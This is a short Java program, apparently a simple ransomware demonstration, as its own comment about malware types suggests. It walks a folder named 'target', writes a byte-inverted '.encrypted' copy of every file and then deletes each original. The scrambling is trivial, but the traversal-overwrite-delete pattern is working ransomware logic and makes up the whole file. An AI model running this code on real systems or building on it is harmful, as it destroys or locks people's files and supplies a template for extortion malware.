import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;

public class App{
    public static void main(String[] args) throws IOException {
        //Malware= {Randsomeware, adware, Spyware, virus, Trojan}

        Path path = Paths.get("target");
        Files.walkFileTree(path, new MyEncryptFileVisitor());

    }
}

class MyEncryptFileVisitor extends SimpleFileVisitor<Path>{

    @Override
    public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
        encryptFile(file);
        return FileVisitResult.CONTINUE;
    }

    private void encryptFile(Path file) throws IOException{
        FileInputStream fileInputStream = new FileInputStream(file.toAbsolutePath().toString());
        File encryptedFile = new File(file.toAbsolutePath() + ".encrypted");
        FileOutputStream fileOutputStream = new FileOutputStream(encryptedFile);
        encryptedFile.createNewFile();
        try{
            int read = -1;
            byte[] buffer = new byte[1024* 2];
            while((read = fileInputStream.read(buffer)) != -1){
                for (int i = 0; i < read; i++) {
                    buffer[i] = (byte) ~buffer[i]; 
                }
                fileOutputStream.write(buffer,0,read);

            }
            

        }finally{
            fileInputStream.close();
            fileOutputStream.close();
            Files.delete(file);
        }
    }

}